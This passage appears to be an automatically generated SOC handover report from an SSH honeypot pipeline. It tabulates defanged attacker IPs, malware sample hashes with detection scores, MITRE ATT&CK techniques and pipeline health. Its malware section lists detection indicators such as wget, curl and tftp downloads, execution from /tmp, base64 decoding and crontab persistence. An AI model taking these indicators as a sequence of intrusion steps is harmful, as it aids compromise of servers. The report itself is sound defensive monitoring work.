| `2026-08-12 04:54:52` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **18** | 2026-08-12 00:59 | 2026-08-12 04:45 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-12 01:19 | 2026-08-12 04:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]213` | **5** | 2026-08-12 02:46 | 2026-08-12 02:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.182[.]224` | **4** | 2026-08-12 03:32 | 2026-08-12 03:38 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `164.92.115[.]22` | **4** | 2026-08-12 02:03 | 2026-08-12 03:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | **3** | 2026-08-12 02:40 | 2026-08-12 02:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-12 01:52 | 2026-08-12 01:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-12 03:40 | 2026-08-12 03:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-12 02:10 | 2026-08-12 02:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-08-12 03:25 | 2026-08-12 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-08-12 01:52 | 2026-08-12 01:58 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `38.172.184[.]129` | **3** | 2026-08-12 01:41 | 2026-08-12 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.142.89[.]193` | **3** | 2026-08-12 03:14 | 2026-08-12 03:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-08-12 02:47 | 2026-08-12 02:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]177` | **3** | 2026-08-12 01:06 | 2026-08-12 01:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]189` | **3** | 2026-08-12 02:48 | 2026-08-12 02:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-12 00:58 | 2026-08-12 00:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-12 04:52 | 2026-08-12 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | **2** | 2026-08-12 03:37 | 2026-08-12 03:40 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]126` | **2** | 2026-08-12 01:31 | 2026-08-12 01:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | **2** | 2026-08-12 02:51 | 2026-08-12 02:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.231.227[.]133` | **2** | 2026-08-12 03:03 | 2026-08-12 03:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]48` | **2** | 2026-08-12 01:21 | 2026-08-12 01:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-08-12 04:01 | 2026-08-12 04:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-08-12 01:14 | 2026-08-12 01:15 | 33s | 0 | `T1592` | 🟢 LOW |
| `111.39.167[.]59` | 1 | 2026-08-12 03:48 | 2026-08-12 03:48 | 29s | 0 | `T1592` | 🟢 LOW |
| `174.64.199[.]88` | 1 | 2026-08-12 03:45 | 2026-08-12 03:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]57` | 1 | 2026-08-12 03:46 | 2026-08-12 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.167.234[.]154` | 1 | 2026-08-12 04:55 | 2026-08-12 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.57[.]72` | 1 | 2026-08-12 00:56 | 2026-08-12 00:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.233.62[.]185` | 1 | 2026-08-12 04:00 | 2026-08-12 04:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `187.61.226[.]113` | 1 | 2026-08-12 01:43 | 2026-08-12 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]230` | 1 | 2026-08-12 02:30 | 2026-08-12 02:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]253` | 1 | 2026-08-12 03:01 | 2026-08-12 03:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.55.70[.]124` | 1 | 2026-08-12 04:25 | 2026-08-12 04:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `202.111.183[.]30` | 1 | 2026-08-12 01:11 | 2026-08-12 01:11 | 4s | 0 | `T1592` | 🟢 LOW |
| `221.202.188[.]169` | 1 | 2026-08-12 03:52 | 2026-08-12 03:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.82.209[.]93` | 1 | 2026-08-12 01:24 | 2026-08-12 01:24 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.76.31[.]34` | 1 | 2026-08-12 03:50 | 2026-08-12 03:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `35.195.192[.]228` | 1 | 2026-08-12 03:50 | 2026-08-12 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-12 04:09 | 2026-08-12 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.173.123[.]51` | 1 | 2026-08-12 04:43 | 2026-08-12 04:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-12 02:39 | 2026-08-12 02:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-08-12 01:36 | 2026-08-12 01:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.71.176[.]237` | 1 | 2026-08-12 03:14 | 2026-08-12 03:14 | 10s | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]41` | 1 | 2026-08-12 02:36 | 2026-08-12 02:36 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]64` | 1 | 2026-08-12 01:35 | 2026-08-12 01:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-08-12 01:38 | 2026-08-12 01:39 | 8s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]132` | 1 | 2026-08-12 01:55 | 2026-08-12 01:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]190` | 1 | 2026-08-12 02:41 | 2026-08-12 02:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-08-12 01:19 | 2026-08-12 01:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-08-12 01:40 | 2026-08-12 01:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]4` | 1 | 2026-08-12 03:01 | 2026-08-12 03:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-08-12 03:48 | 2026-08-12 03:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]145` | 1 | 2026-08-12 02:30 | 2026-08-12 02:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.244.107[.]231` | 1 | 2026-08-12 02:33 | 2026-08-12 02:33 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `88.84.209[.]146` | RU | Flex network in Moscow region | **100** ⚠️ | 50 |
| `119.207.63[.]208` | KR | Korea Telecom | **100** ⚠️ | 30 |
| `89.21.67[.]145` | NL | Infrawatch Limited | **100** ⚠️ | 37 |
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `66.132.195[.]48` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `213.154.80[.]51` | SN | PCCI Internet | **100** ⚠️ | 50 |
| `183.171.57[.]72` | MY | Celcom Axiata Berhad | **100** ⚠️ | 10 |
| `111.70.14[.]135` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `194.165.16[.]166` | LT | Flyservers S.A. | **100** ⚠️ | 50 |
| `183.63.220[.]210` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 177 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 156 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 73 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 72 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 72 |

---

## 🔕 False Positive Summary (98 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 85 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 376 cases |
| Tool 34  | Credential Extractor        | ✅ 187 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 133 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 98 filtered (26.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 87 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 155 priority case(s) shown individually · 56 recon entry/entries in table (24 group(s) consolidating 91 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-12T05:41:14Z_
